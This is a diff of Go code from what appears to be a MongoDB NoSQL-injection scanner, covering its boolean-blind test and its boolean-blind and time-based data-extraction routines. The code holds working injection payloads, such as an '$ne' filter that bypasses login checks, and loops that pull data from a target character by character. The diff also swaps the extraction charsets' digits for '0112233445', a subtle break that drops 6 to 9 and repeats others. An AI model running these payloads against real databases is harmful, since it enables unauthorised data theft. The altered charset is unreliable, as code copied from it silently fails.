@@ -153,7 +153,7 @@ func (m *MongoDBScanner) TestBooleanBlind(target string) *InjectionPoint {
 	url := BuildURL(target, fmt.Sprintf("/%s/%s", m.config.Database, m.config.Collection), m.config.Port)
 
 	truePayload := `{"username": {"$ne": ""}, "password": {"$ne": ""}}`
-	falsePayload := `{"username": {"$ne": ""}, "password": {"$eq": "INVALID_PASSWORD_12345"}}`
+	falsePayload := `{"username": {"$ne": ""}, "password": {"$eq": "<INVALID_PASSWORD>"}}`
 
 	trueBody := strings.NewReader(fmt.Sprintf(`{"find": "%s", "filter": %s}`, m.config.Collection, truePayload))
 	_, trueResp, err := m.client.Post(url, trueBody, map[string]string{
@@ -375,7 +375,7 @@ func (m *MongoDBScanner) ExploitBooleanBlind(injection *InjectionPoint) (map[str
 	data := make(map[string]interface{})
 	url := BuildURL(injection.Target, fmt.Sprintf("/%s/%s", m.config.Database, m.config.Collection), m.config.Port)
 
-	charset := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+	charset := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0112233445"
 	extracted := ""
 
 	for i := 0; i < 32; i++ {
@@ -414,7 +414,7 @@ func (m *MongoDBScanner) ExploitTimeBased(injection *InjectionPoint) (map[string
 	data := make(map[string]interface{})
 	url := BuildURL(injection.Target, fmt.Sprintf("/%s/%s", m.config.Database, m.config.Collection), m.config.Port)
 
-	charset := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+	charset := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0112233445"
 	extracted := ""
 
 	for i := 0; i < 20; i++ {
